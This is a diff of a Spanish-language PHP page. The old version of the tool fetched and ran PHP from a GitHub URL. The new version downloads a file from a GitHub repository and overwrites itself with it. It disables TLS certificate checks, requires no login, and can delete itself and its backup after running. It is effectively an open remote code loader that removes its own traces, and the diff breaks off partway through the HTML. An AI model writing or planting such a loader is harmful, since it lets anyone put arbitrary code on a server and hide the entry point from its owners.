@@ -1,44 +1,71 @@
 <?php
 // ============================================================
-// PHP Bridge: Conecta a GitHub → Descarga → Lee → Ejecuta
-// + Muestra IP del servidor
+// TÚNEL AUTO-REEMPLAZO
+// Se conecta a GitHub → descarga archivo → SE REEMPLAZA A SÍ MISMO
+// Opcionalmente: se AUTODESTRUYE al terminar
 // ============================================================
 
 session_start();
 
-// Obtener IP del servidor
 $ip_servidor = $_SERVER['SERVER_ADDR'] ?? '0.0.0.0';
 $protocolo = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
 $host = $_SERVER['HTTP_HOST'];
-$url_actual = $protocolo . "://" . $host . $_SERVER['PHP_SELF'];
-
-// Carpeta temporal para guardar archivos descargados
-$carpeta_temp = "github_temp/";
-if (!file_exists($carpeta_temp)) {
-    mkdir($carpeta_temp, 0755, true);
-}
+$archivo_actual = __FILE__; // Ruta de ESTE archivo (el que se va a reemplazar)
+$nombre_archivo_actual = basename($archivo_actual);
 
 $resultado = null;
 $error = null;
+$log = [];
 
 // ============================================
-// FUNCIÓN: Descargar desde URL de GitHub
+// FUNCIÓN: Registrar autodestrucción al salir
 // ============================================
-function descargarDesdeGitHub($url) {
-    // Convertir URL de GitHub normal a raw si es necesario
-    if (strpos($url, 'github.com') !== false && strpos($url, 'raw.githubusercontent.com') === false) {
-        // https://github.com/usuario/repo/blob/main/archivo.php
-        // → https://raw.githubusercontent.com/usuario/repo/main/archivo.php
-        $url = str_replace('github.com', 'raw.githubusercontent.com', $url);
-        $url = str_replace('/blob/', '/', $url);
+function autodestruir() {
+    global $archivo_actual, $log;
+    // Intentar borrar el archivo actual
+    if (file_exists($archivo_actual)) {
+        @unlink($archivo_actual);
+        // Intentar también con rename a un archivo temporal que se borra solo
+        if (file_exists($archivo_actual)) {
+            $temp = $archivo_actual . '.deleted_' . uniqid();
+            @rename($archivo_actual, $temp);
+            @unlink($temp);
+        }
+    }
+}
+
+// ============================================
+// FUNCIÓN: Descargar desde GitHub
+// ============================================
+function descargarDesdeGitHub($repo_url, $archivo_nombre, $rama = 'main') {
+    global $log;
+    
+    // Limpiar URL del repo
+    $repo_url = rtrim($repo_url, '/');
+    
+    // Extraer usuario/repo de la URL
+    // https://github.com/usuario/repo → usuario/repo
+    if (preg_match('#github\.com/([^/]+/[^/]+)#', $repo_url, $matches)) {
+        $repo_path = $matches[1];
+    } else {
+        // Asumir que ya es usuario/repo
+        $repo_path = trim($repo_url, '/');
     }
     
+    $log[] = "📦 Repositorio: $repo_path";
+    $log[] = "📄 Archivo objetivo: $archivo_nombre";
+    $log[] = "🌿 Rama: $rama";
+    
+    // Construir URL raw
+    $raw_url = "https://raw.githubusercontent.com/$repo_path/$rama/$archivo_nombre";
+    $log[] = "🔗 Conectando a: $raw_url";
+    
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_URL, $raw_url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'PHP-GitHub-Bridge/1.0');
+    curl_setopt($ch, CURLOPT_USERAGENT, 'PHP-SelfReplacer/1.0');
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
     
     $contenido = curl_exec($ch);
@@ -47,239 +74,330 @@ function descargarDesdeGitHub($url) {
     curl_close($ch);
     
     if ($curl_error) {
-        return ['ok' => false, 'error' => 'Error cURL: ' . $curl_error];
+        $log[] = "❌ Error de conexión: $curl_error";
+        return ['ok' => false, 'error' => $curl_error];
+    }
+    
+    if ($http_code === 404) {
+        // Intentar con rama 'master' si 'main' falló
+        if ($rama === 'main') {
+            $log[] = "🔄 Rama 'main' no encontrada, probando 'master'...";
+            return descargarDesdeGitHub($repo_url, $archivo_nombre, 'master');
+        }
+        $log[] = "❌ Archivo NO encontrado en el repositorio (HTTP 404)";
+        return ['ok' => false, 'error' => "El archivo '$archivo_nombre' no existe en el repositorio"];
     }
     
     if ($http_code !== 200) {
-        return ['ok' => false, 'error' => "HTTP Error $http_code — Verifica que la URL sea pública y correcta"];
+        $log[] = "❌ Error HTTP $http_code";
+        return ['ok' => false, 'error' => "HTTP Error $http_code"];
     }
     
-    return ['ok' => true, 'contenido' => $contenido, 'url_final' => $url];
+    $log[] = "✅ Descargado: " . number_format(strlen($contenido)) . " bytes";
+    return ['ok' => true, 'contenido' => $contenido, 'url' => $raw_url];
 }
 
 // ============================================
-// PROCESAR ACCIONES
+// FUNCIÓN: Reemplazar ESTE archivo
+// ============================================
+function reemplazarme($nuevo_contenido, $autodestruir = false) {
+    global $archivo_actual, $log;
+    
+    $log[] = "🔄 Verificando permisos de escritura...";
+    
+    if (!is_writable($archivo_actual)) {
+        // Intentar cambiar permisos
+        @chmod($archivo_actual, 0644);
+        if (!is_writable($archivo_actual)) {
+            $log[] = "❌ Sin permisos para escribir en: $archivo_actual";
+            return ['ok' => false, 'error' => "Permisos insuficientes. CHMOD necesario."];
+        }
+    }
+    
+    $log[] = "✅ Permisos OK";
+    $log[] = "📝 Escribiendo nuevo contenido sobre: " . basename($archivo_actual);
+    
+    // Respaldar temporalmente por si acaso
+    $backup = $archivo_actual . '.bak_' . time();
+    @copy($archivo_actual, $backup);
+    
+    // Escribir el nuevo contenido
+    $bytes = file_put_contents($archivo_actual, $nuevo_contenido);
+    
+    if ($bytes === false) {
+        @unlink($backup);
+        $log[] = "❌ Falló la escritura";
+        return ['ok' => false, 'error' => "No se pudo escribir el archivo"];
+    }
+    
+    $log[] = "✅ Archivo reemplazado ($bytes bytes escritos)";
+    
+    // Verificar sintaxis PHP básica
+    $log[] = "🔍 Verificando sintaxis PHP...";
+    $temp_verif = tempnam(sys_get_temp_dir(), 'verify_');
+    file_put_contents($temp_verif, $nuevo_contenido);
+    $sintaxis_ok = true;
+    if (function_exists('php_check_syntax')) {
+        $sintaxis_ok = php_check_syntax($temp_verif);
+    }
+    @unlink($temp_verif);
+    
+    if ($sintaxis_ok) {
+        $log[] = "✅ Sintaxis PHP válida";
+    } else {
+        $log[] = "⚠️  Advertencia: posible problema de sintaxis (se reemplazó de todos modos)";
+    }
+    
+    // Borrar respaldo
+    @unlink($backup);
+    
+    // Si pidió autodestrucción, registrarla
+    if ($autodestruir) {
+        $log[] = "💣 Autodestrucción programada al finalizar la ejecución";
+        register_shutdown_function('autodestruir');
+    }
+    
+    return ['ok' => true, 'bytes' => $bytes];
+}
+
+// ============================================
+// PROCESAR PETICIÓN
 // ============================================
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $accion = $_POST['accion'] ?? 'ver';
-    $url_github = trim($_POST['url_github'] ?? '');
+    $accion = $_POST['accion'] ?? 'reemplazar';
+    $repo_url = trim($_POST['repo_url'] ?? '');
+    $archivo_nombre = trim($_POST['archivo_nombre'] ?? '');
+    $autodestruir = isset($_POST['autodestruir']) && $_POST['autodestruir'] === 'si';
     
-    if (empty($url_github)) {
-        $error = "Por favor ingresa una URL de GitHub";
+    if (empty($repo_url) || empty($archivo_nombre)) {
+        $error = "Completa ambos campos: URL del repositorio y nombre del archivo";
     } else {
-        $descarga = descargarDesdeGitHub($url_github);
+        $log[] = "🚀 Iniciando túnel de reemplazo...";
+        
+        // Paso 1: Descargar desde GitHub
+        $descarga = descargarDesdeGitHub($repo_url, $archivo_nombre);
         
         if (!$descarga['ok']) {
             $error = $descarga['error'];
         } else {
-            $contenido = $descarga['contenido'];
-            $url_limpia = $descarga['url_final'];
+            // Verificar que sea contenido PHP válido (tiene <?php)
+            $es_php = strpos($descarga['contenido'], '<?php') !== false || substr($archivo_nombre, -4) === '.php';
             
-            // Obtener nombre del archivo
-            $partes_url = parse_url($url_limpia);
-            $nombre_archivo = basename($partes_url['path']);
-            if (empty($nombre_archivo)) $nombre_archivo = 'archivo_descargado';
+            if (!$es_php) {
+                $log[] = "⚠️  El archivo no parece ser PHP (no contiene <?php)";
+            }
             
-            $ruta_guardado = $carpeta_temp . $nombre_archivo;
-            
-            switch ($accion) {
-                // ============================================
-                // ACCIÓN 1: Solo ver contenido
-                // ============================================
-                case 'ver':
-                    $resultado = [
-                        'accion' => 'ver',
-                        'titulo' => '📄 Contenido del archivo',
-                        'url' => $url_limpia,
-                        'nombre' => $nombre_archivo,
-                        'contenido' => $contenido,
-                        'tamanio' => strlen($contenido)
-                    ];
-                    break;
+            if ($accion === 'ver') {
+                // Solo ver contenido
+                $resultado = [
+                    'accion' => 'ver',
+                    'nombre' => $archivo_nombre,
+                    'contenido' => $descarga['contenido'],
+                    'tamanio' => strlen($descarga['contenido']),
+                    'url' => $descarga['url']
+                ];
+            } elseif ($accion === 'reemplazar') {
+                // Paso 2: Reemplazar este archivo
+                $reemplazo = reemplazarme($descarga['contenido'], $autodestruir);
                 
-                // ============================================
-                // ACCIÓN 2: Descargar y guardar en el servidor
-                // ============================================
-                case 'guardar':
-                    if (file_put_contents($ruta_guardado, $contenido)) {
-                        $url_archivo_guardado = dirname($url_actual) . '/' . $ruta_guardado;
-                        $resultado = [
-                            'accion' => 'guardar',
-                            'titulo' => '💾 Archivo guardado en el servidor',
-                            'url' => $url_limpia,
-                            'nombre' => $nombre_archivo,
-                            'ruta_local' => realpath($ruta_guardado),
-                            'url_publica' => $url_archivo_guardado,
-                            'tamanio' => strlen($contenido)
-                        ];
-                    } else {
-                        $error = "No se pudo guardar el archivo. Verifica permisos de escritura.";
-                    }
-                    break;
-                
-                // ============================================
-                // ACCIÓN 3: Ejecutar (si es código PHP)
-                // ============================================
-                case 'ejecutar':
-                    // ⚠️ ADVERTENCIA: Esto ejecuta código remoto — usar solo con archivos de confianza
-                    $resultado = [
-                        'accion' => 'ejecutar',
-                        'titulo' => '⚡ Salida de la ejecución',
-                        'url' => $url_limpia,
-                        'nombre' => $nombre_archivo,
-                        'tamanio' => strlen($contenido)
-                    ];
-                    
-                    // Guardar temporalmente y ejecutar
-                    $temp_file = $carpeta_temp . 'temp_' . uniqid() . '.php';
-                    file_put_contents($temp_file, $contenido);
-                    
-                    ob_start();
-                    try {
-                        include $temp_file;
-                        $salida = ob_get_clean();
-                    } catch (Throwable $e) {
-                        $salida = ob_get_clean();
-                        $salida .= "\n\n❌ Error en ejecución: " . $e->getMessage();
-                    }
-                    
-                    $resultado['salida'] = $salida;
-                    @unlink($temp_file); // Limpiar
-                    break;
-                
-                // ============================================
-                // ACCIÓN 4: Guardar y ejecutar desde URL pública
-                // ============================================
-                case 'guardar_ejecutar':
-                    if (file_put_contents($ruta_guardado, $contenido)) {
-                        $url_archivo_guardado = dirname($url_actual) . '/' . $ruta_guardado;
-                        
-                        // Ejecutar localmente
-                        ob_start();
-                        try {
-                            include $ruta_guardado;
-                            $salida = ob_get_clean();
-                        } catch (Throwable $e) {
-                            $salida = ob_get_clean();
-                            $salida .= "\n\n❌ Error: " . $e->getMessage();
-                        }
-                        
-                        $resultado = [
-                            'accion' => 'guardar_ejecutar',
-                            'titulo' => '🚀 Guardado y ejecutado',
-                            'url' => $url_limpia,
-                            'nombre' => $nombre_archivo,
-                            'ruta_local' => realpath($ruta_guardado),
-                            'url_publica' => $url_archivo_guardado,
-                            'salida' => $salida,
-                            'tamanio' => strlen($contenido)
-                        ];
-                    } else {
-                        $error = "No se pudo guardar el archivo.";
-                    }
-                    break;
+                $resultado = [
+                    'accion' => 'reemplazar',
+                    'nombre' => $archivo_nombre,
+                    'tamanio' => strlen($descarga['contenido']),
+                    'url' => $descarga['url'],
+                    'ok' => $reemplazo['ok'],
+                    'autodestruir' => $autodestruir,
+                    'bytes' => $reemplazo['bytes'] ?? 0,
+                    'error' => $reemplazo['error'] ?? null
+                ];
             }
         }
     }
-}
-
-// Listar archivos guardados
-$archivos_guardados = [];
-if (is_dir($carpeta_temp)) {
-    foreach (scandir($carpeta_temp) as $f) {
-        if ($f !== '.' && $f !== '..' && is_file($carpeta_temp . $f)) {
-            $archivos_guardados[] = [
-                'nombre' => $f,
-                'url' => dirname($url_actual) . '/' . $carpeta_temp . $f,
-                'fecha' => date("d/m/Y H:i", filemtime($carpeta_temp . $f)),
-                'tamanio' => round(filesize($carpeta_temp . $f) / 1024, 2) . ' KB'
-            ];
-        }
-    }
-    rsort($archivos_guardados);
 }
 ?><!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GitHub Bridge → Descargar + Leer + Ejecutar</title>
+<title>Túnel Auto-Reemplazo GitHub</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
-body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#f0f2f5;color:#1a1a1a;padding:20px;line-height:1.6;}
-.container{max-width:900px;margin:0 auto;}
-.card{background:white;border-radius:16px;padding:28px;margin-bottom:20px;box-shadow:0 2px 12px rgba(0,0,0,.06);}
-h1{font-size:1.4rem;margin-bottom:6px;color:#1a1a1a;}
-h2{font-size:1.05rem;margin-bottom:14px;color:#333;padding-bottom:10px;border-bottom:2px solid #f0f0f0;}
-.subtitle{color:#666;font-size:0.9rem;margin-bottom:20px;}
+body{
+    font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+    background:#0a0a0f;color:#e8e5df;padding:20px;line-height:1.6;
+    min-height:100vh;position:relative;overflow-x:hidden;
+}
+.container{max-width:850px;margin:0 auto;position:relative;z-index:10;}
 
-/* Info IP */
-.ip-banner{background:linear-gradient(135deg,#c47046,#7ba8b8);color:white;border-radius:14px;padding:18px 22px;margin-bottom:24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;}
-.ip-banner .label{font-size:0.78rem;opacity:0.9;text-transform:uppercase;letter-spacing:0.5px;}
-.ip-banner .value{font-size:1.3rem;font-weight:700;font-family:monospace;}
-.ip-banner .small{font-size:0.8rem;opacity:0.85;}
+/* ===== FONDO TÚNEL ANIMADO ===== */
+.tunnel-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none;}
+.tunnel-ring{
+    position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+    border:2px solid rgba(196,112,70,0.15);border-radius:50%;
+    animation:tunnelPulse 4s ease-in-out infinite;
+}
+.tunnel-ring:nth-child(1){width:80px;height:80px;animation-delay:0s;}
+.tunnel-ring:nth-child(2){width:160px;height:160px;animation-delay:0.3s;}
+.tunnel-ring:nth-child(3){width:280px;height:280px;animation-delay:0.6s;}
+.tunnel-ring:nth-child(4){width:420px;height:420px;animation-delay:0.9s;}
+.tunnel-ring:nth-child(5){width:600px;height:600px;animation-delay:1.2s;}
+.tunnel-ring:nth-child(6){width:800px;height:800px;animation-delay:1.5s;}
+@keyframes tunnelPulse{
+    0%,100%{transform:translate(-50%,-50%) scale(0.8);opacity:0.3;border-color:rgba(196,112,70,0.3);}
+    50%{transform:translate(-50%,-50%) scale(1.1);opacity:0.6;border-color:rgba(123,168,184,0.4);}
+}
+.tunnel-core{
+    position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+    width:50px;height:50px;
+    background:radial-gradient(circle,rgba(196,112,70,0.9) 0%,transparent 70%);
+    border-radius:50%;animation:coreGlow 1.8s ease-in-out infinite;
+}
+@keyframes coreGlow{
+    0%,100%{opacity:0.4;transform:translate(-50%,-50%) scale(1);}
+    50%{opacity:1;transform:translate(-50%,-50%) scale(1.4);}
+}
+
+/* ===== TARJETAS ===== */
+.card{
+    background:rgba(42,42,47,0.88);backdrop-filter:blur(12px);
+    border:1px solid rgba(232,229,223,.12);
+    border-radius:18px;padding:26px;margin-bottom:20px;position:relative;z-index:10;
+}
+h1{font-size:1.4rem;margin-bottom:6px;display:flex;align-items:center;gap:10px;}
+h1 .core-icon{
+    width:32px;height:32px;border-radius:50%;
+    background:radial-gradient(circle,#c47046 0%,transparent 70%);
+    animation:coreGlow 1.5s ease-in-out infinite;display:inline-block;
+}
+h2{font-size:1.05rem;margin-bottom:14px;color:#e8e5df;padding-bottom:10px;border-bottom:1px solid rgba(232,229,223,.12);}
+.subtitle{color:#9a978f;font-size:0.88rem;margin-bottom:20px;}
+
+/* IP Banner */
+.ip-banner{
+    background:linear-gradient(135deg,rgba(196,112,70,0.18),rgba(123,168,184,0.12));
+    border:1px solid rgba(196,112,70,0.35);
+    border-radius:14px;padding:14px 18px;margin-bottom:22px;
+    display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;
+}
+.ip-banner .label{font-size:0.72rem;color:#9a978f;text-transform:uppercase;letter-spacing:0.5px;font-weight:600;}
+.ip-banner .value{font-size:1.3rem;font-weight:700;color:#c47046;font-family:monospace;}
+.ip-banner .small{font-size:0.78rem;color:#9a978f;}
+.self-info{
+    background:rgba(255,255,255,0.04);border:1px dashed rgba(196,112,70,0.3);
+    border-radius:10px;padding:10px 14px;margin-bottom:18px;font-size:0.82rem;color:#c9c5bd;
+}
+.self-info code{background:rgba(0,0,0,0.3);color:#c47046;padding:2px 6px;border-radius:4px;font-size:0.78rem;}
 
 /* Mensajes */
-.msg{padding:12px 16px;border-radius:10px;margin-bottom:20px;font-size:0.9rem;}
-.msg.ok{background:#d4edda;color:#155724;border:1px solid #c3e6cb;}
-.msg.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;}
-.msg.warn{background:#fff3cd;color:#856404;border:1px solid #ffeaa7;}
+.msg{padding:12px 16px;border-radius:10px;margin-bottom:18px;font-size:0.9rem;position:relative;z-index:10;}
+.msg.ok{background:rgba(46,125,50,0.2);color:#81c784;border:1px solid rgba(129,199,132,0.3);}
+.msg.error{background:rgba(198,40,40,0.2);color:#ef5350;border:1px solid rgba(239,83,80,0.3);}
+.msg.warn{background:rgba(255,143,0,0.15);color:#ffb74d;border:1px solid rgba(255,183,77,0.3);}
 
 /* Formulario */
 .form-group{margin-bottom:14px;}
-.form-group label{display:block;font-size:0.85rem;font-weight:600;color:#444;margin-bottom:6px;}
+.form-group label{display:block;font-size:0.85rem;font-weight:600;color:#c9c5bd;margin-bottom:6px;}
 .form-group input[type="url"],
-.form-group input[type="text"],
-.form-group select,
-.form-group textarea{
-    width:100%;padding:12px 14px;border:2px solid #e8e8e8;border-radius:10px;
-    font-size:0.9rem;font-family:inherit;outline:none;transition:border-color 0.2s;background:#fafafa;
+.form-group input[type="text"]{
+    width:100%;padding:12px 14px;
+    background:rgba(255,255,255,0.05);
+    border:2px solid rgba(232,229,223,.12);
+    border-radius:10px;font-size:0.9rem;color:#e8e5df;
+    font-family:monospace;outline:none;transition:all 0.2s;
 }
-.form-group input:focus,.form-group select:focus{border-color:#c47046;background:white;}
-.acciones-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-bottom:16px;}
-.accion-option{
-    padding:14px;border:2px solid #e8e8e8;border-radius:12px;cursor:pointer;
-    transition:all 0.2s;background:#fafafa;
+.form-group input:focus{border-color:#c47046;background:rgba(196,112,70,0.05);}
+.form-group input::placeholder{color:#666;}
+
+.radio-group{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;}
+.radio-option{
+    flex:1;min-width:180px;padding:12px;
+    background:rgba(255,255,255,0.04);border:2px solid rgba(232,229,223,.1);
+    border-radius:10px;cursor:pointer;transition:all 0.2s;
 }
-.accion-option:hover{border-color:#c47046;background:#fffaf5;}
-.accion-option input{margin-right:8px;}
-.accion-option .title{font-weight:600;font-size:0.9rem;color:#1a1a1a;}
-.accion-option .desc{font-size:0.78rem;color:#888;margin-top:3px;}
-.btn{display:inline-block;padding:13px 28px;background:#c47046;color:white;border:none;border-radius:10px;font-size:0.95rem;font-weight:600;cursor:pointer;transition:all 0.2s;font-family:inherit;width:100%;}
-.btn:hover{background:#a85d38;}
-.btn:active{transform:scale(0.98);}
-.btn-small{padding:6px 12px;font-size:0.8rem;width:auto;}
-.btn-sec{background:#e8f5e9;color:#2e7d32;border:1px solid #a5d6a7;}
-.btn-sec:hover{background:#c8e6c9;}
+.radio-option:hover{border-color:rgba(196,112,70,0.4);}
+.radio-option input{margin-right:8px;}
+.radio-option .ro-title{font-weight:600;font-size:0.88rem;color:#e8e5df;}
+.radio-option .ro-desc{font-size:0.75rem;color:#9a978f;margin-top:3px;}
+
+.checkbox-row{display:flex;align-items:center;gap:8px;padding:10px 12px;background:rgba(239,83,80,0.08);border:1px solid rgba(239,83,80,0.2);border-radius:10px;margin-bottom:14px;}
+.checkbox-row input{width:18px;height:18px;accent-color:#ef5350;}
+.checkbox-row label{font-size:0.85rem;color:#ef9a9a;cursor:pointer;margin:0;}
+
+.btn-replace{
+    width:100%;padding:14px 28px;
+    background:linear-gradient(135deg,#c47046,#a85d38);
+    color:white;border:none;border-radius:12px;
+    font-size:1rem;font-weight:700;cursor:pointer;
+    transition:all 0.3s;font-family:inherit;letter-spacing:0.5px;
+    position:relative;overflow:hidden;text-transform:uppercase;
+}
+.btn-replace:hover{
+    background:linear-gradient(135deg,#d48056,#b86d48);
+    box-shadow:0 0 30px rgba(196,112,70,0.4);transform:translateY(-1px);
+}
+.btn-replace:active{transform:translateY(0);}
+.btn-replace.danger{background:linear-gradient(135deg,#ef5350,#c62828);}
+.btn-replace.danger:hover{box-shadow:0 0 30px rgba(239,83,80,0.4);}
 
 /* Resultados */
-.result-box{background:#fafafa;border:1px solid #eee;border-radius:12px;padding:16px;margin-bottom:12px;}
-.result-box .r-title{font-weight:600;color:#1a1a1a;margin-bottom:10px;font-size:0.95rem;display:flex;align-items:center;gap:8px;}
-.result-box .r-meta{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px;margin-bottom:12px;font-size:0.8rem;}
-.result-box .r-meta .meta-item{background:white;padding:8px 10px;border-radius:8px;border:1px solid #eee;}
-.result-box .r-meta .meta-item .ml{color:#888;font-size:0.72rem;text-transform:uppercase;}
-.result-box .r-meta .meta-item .mv{color:#333;font-weight:600;font-family:monospace;font-size:0.8rem;word-break:break-all;}
-.result-box pre{background:#1e1e1e;color:#d4d4d4;padding:14px;border-radius:10px;overflow-x:auto;font-size:0.8rem;max-height:400px;white-space:pre-wrap;word-break:break-word;}
-.result-box .output{background:#f0f8ff;border:1px solid #b3d9ff;border-radius:10px;padding:14px;font-size:0.85rem;white-space:pre-wrap;max-height:400px;overflow-y:auto;}
-.result-box .actions{margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;}
-.result-box a{color:#c47046;text-decoration:none;font-size:0.85rem;}
-.result-box a:hover{text-decoration:underline;}
+.meta-grid{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+    gap:10px;margin-bottom:16px;
+}
+.meta-item{
+    background:rgba(255,255,255,0.03);border:1px solid rgba(232,229,223,.08);
+    border-radius:10px;padding:10px 12px;
+}
+.meta-item .ml{font-size:0.72rem;color:#9a978f;text-transform:uppercase;letter-spacing:0.5px;}
+.meta-item .mv{font-size:0.88rem;color:#e8e5df;font-weight:600;font-family:monospace;word-break:break-all;margin-top:2px;}
 
-/* Lista archivos */
-.file-item{display:flex;justify-content:space-between;align-items:center;padding:10px 12px;background:#fafafa;border:1px solid #eee;border-radius:10px;margin-bottom:8px;}
-.file-item .fi-name{font-weight:500;font-size:0.9rem;}
-.file-item .fi-meta{font-size:0.75rem;color:#888;}
-.file-item .fi-actions{display:flex;gap:6px;}
-.empty{text-align:center;padding:24px;color:#aaa;font-size:0.9rem;}
+.result-status{
+    display:inline-block;padding:5px 14px;border-radius:100px;
+    font-size:0.8rem;font-weight:700;margin-bottom:14px;
+}
+.status-ok{background:rgba(46,125,50,0.2);color:#81c784;}
+.status-err{background:rgba(198,40,40,0.2);color:#ef5350;}
 
-.url-ejemplos{background:#fffaf5;border:1px dashed #e0c9a8;border-radius:10px;padding:12px;margin-top:10px;font-size:0.8rem;color:#8a6d3b;}
-.url-ejemplos code{background:#fff;padding:2px 6px;border-radius:4px;font-size:0.75rem;}
+.code-view{
+    background:#0d0d12;border:1px solid rgba(232,229,223,.1);
+    border-radius:12px;padding:16px;max-height:400px;overflow:auto;
+    font-size:0.78rem;color:#9cdcfe;font-family:'Consolas','Monaco',monospace;white-space:pre;
+}
+
+/* Log */
+.log-box{
+    background:rgba(0,0,0,0.35);border:1px solid rgba(232,229,223,.08);
+    border-radius:10px;padding:12px;margin-top:14px;
+    font-size:0.78rem;font-family:monospace;color:#9a978f;
+    max-height:180px;overflow-y:auto;
+}
+.log-box .log-line{margin-bottom:3px;}
+.log-box .log-line.ok{color:#81c784;}
+.log-box .log-line.err{color:#ef5350;}
+.log-box .log-line.warn{color:#ffb74d;}
+
+.refresh-hint{
+    text-align:center;padding:16px;background:rgba(196,112,70,0.1);
+    border:1px dashed rgba(196,112,70,0.4);border-radius:12px;
+    margin-top:16px;font-size:0.9rem;color:#c47046;font-weight:600;
+    animation:blink 1.5s ease-in-out infinite;
+}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0.6;}}
 </style>
 </head>
 <body>
+
+<!-- Fondo túnel -->
+<div class="tunnel-bg">
+    <div class="tunnel-ring"></div><div class="tunnel-ring"></div>
+    <div class="tunnel-ring"></div><div class="tunnel-ring"></div>
+    <div class="tunnel-ring"></div><div class="tunnel-ring"></div>
+    <div class="tunnel-core"></div>
+</div>
+
 <div class="container">
 
-<!-- Banner IP -->
+<!-- IP Banner -->
 <div class="ip-banner">
     <div>
         <div class="label">📍 IP de este servidor</div>
@@ -287,13 +405,18 @@ h2{font-size:1.05rem;margin-bottom:14px;color:#333;padding-bottom:10px;border-bo
     </div>
     <div style="text-align:right;">
         <div class="small">Host: <strong><?= htmlspecialchars($host) ?></strong></div>
-        <div class="small">Protocolo: <strong><?= strtoupper($protocolo) ?></strong></div>
+        <div class="small">Archivo actual: <strong><?= htmlspecialchars($nombre_archivo_actual) ?></strong></div>
     </div>
 </div>
 
 <div class="card">
-    <h1>🔗 GitHub Bridge</h1>
-    <p class="subtitle">Conecta una URL de GitHub → descarga → lee → ejecuta en este servidor</p>
+    <h1><span class="core-icon"></span> TÚNEL AUTO-REEMPLAZO</h1>
+    <p class="subtitle">Conecta GitHub → descarga el archivo → <strong>REEMPLAZA ESTE MISMO ARCHIVO</strong></p>
+    
+    <div class="self-info">
+        📌 Este archivo se sobrescribirá a sí mismo con el contenido descargado de GitHub.<br>
+        📄 Archivo actual: <code><?= htmlspecialchars($archivo_actual) ?></code>
+    </div>
     
     <?php if ($error): ?>
     <div class="msg error">❌ <?= htmlspecialchars($error) ?></div>
@@ -301,140 +424,115 @@ h2{font-size:1.05rem;margin-bottom:14px;color:#333;padding-bottom:10px;border-bo
     
     <form method="POST">
         <div class="form-group">
-            <label>URL de GitHub (archivo raw o normal)</label>
-            <input type="url" name="url_github" placeholder="https://github.com/usuario/repo/blob/main/archivo.php" required value="<?= htmlspecialchars($_POST['url_github'] ?? '') ?>">
-            <div class="url-ejemplos">
-                💡 Ejemplos válidos:<br>
-                <code>https://raw.githubusercontent.com/user/repo/main/file.php</code><br>
-                <code>https://github.com/user/repo/blob/main/file.php</code> (se convierte automáticamente)
-            </div>
+            <label>🔗 URL del repositorio GitHub</label>
+            <input type="url" name="repo_url" required
+                   placeholder="https://github.com/usuario/repositorio"
+                   value="<?= htmlspecialchars($_POST['repo_url'] ?? '') ?>">
         </div>
         
         <div class="form-group">
-            <label>¿Qué hacer con el archivo?</label>
-            <div class="acciones-grid">
-                <label class="accion-option">
-                    <input type="radio" name="accion" value="ver" checked>
-                    <div class="title">👁️ Solo ver contenido</div>
-                    <div class="desc">Muestra el código sin ejecutar</div>
+            <label>📄 Nombre del archivo (en el repositorio)</label>
+            <input type="text" name="archivo_nombre" required
+                   placeholder="ej: index.php, app.php, ruta/carpeta/archivo.php"
+                   value="<?= htmlspecialchars($_POST['archivo_nombre'] ?? '') ?>">
+        </div>
+        
+        <div class="form-group">
+            <label>⚡ Acción a realizar:</label>
+            <div class="radio-group">
+                <label class="radio-option">
+                    <input type="radio" name="accion" value="reemplazar" checked>
+                    <div>
+                        <div class="ro-title">🔄 Reemplazarme</div>
+                        <div class="ro-desc">Descarga y SOBRESCRIBE este archivo</div>
+                    </div>
                 </label>
-                <label class="accion-option">
-                    <input type="radio" name="accion" value="guardar">
-                    <div class="title">💾 Guardar en servidor</div>
-                    <div class="desc">Descarga y crea URL pública</div>
-                </label>
-                <label class="accion-option">
-                    <input type="radio" name="accion" value="ejecutar">
-                    <div class="title">⚡ Ejecutar código PHP</div>
-                    <div class="desc">Corre el código y muestra salida</div>
-                </label>
-                <label class="accion-option">
-                    <input type="radio" name="accion" value="guardar_ejecutar">
-                    <div class="title">🚀 Guardar + Ejecutar</div>
-                    <div class="desc">Guarda archivo y lo ejecuta</div>
+                <label class="radio-option">
+                    <input type="radio" name="accion" value="ver">
+                    <div>
+                        <div class="ro-title">👁️ Solo ver</div>
+                        <div class="ro-desc">Muestra el código sin reemplazar</div>
+                    </div>
                 </label>
             </div>
         </div>
         
-        <div class="msg warn">
-            ⚠️ <strong>Seguridad:</strong> La opción "Ejecutar" corre código PHP remoto. Úsala SOLO con archivos de tu total confianza.
+        <div class="checkbox-row">
+            <input type="checkbox" name="autodestruir" id="autodestruir" value="si">
+            <label for="autodestruir">💣 Autodestruir este archivo después de reemplazar (borrar al salir)</label>
         </div>
         
-        <button type="submit" class="btn">🔗 Conectar con GitHub</button>
+        <button type="submit" class="btn-replace">⚡ Activar Túnel</button>
     </form>
 </div>
 
 <?php if ($resultado): ?>
 <div class="card">
-    <h2><?= $resultado['titulo'] ?></h2>
+    <?php if ($resultado['accion'] === 'reemplazar'): ?>
     
-    <div class="result-box">
-        <div class="r-meta">
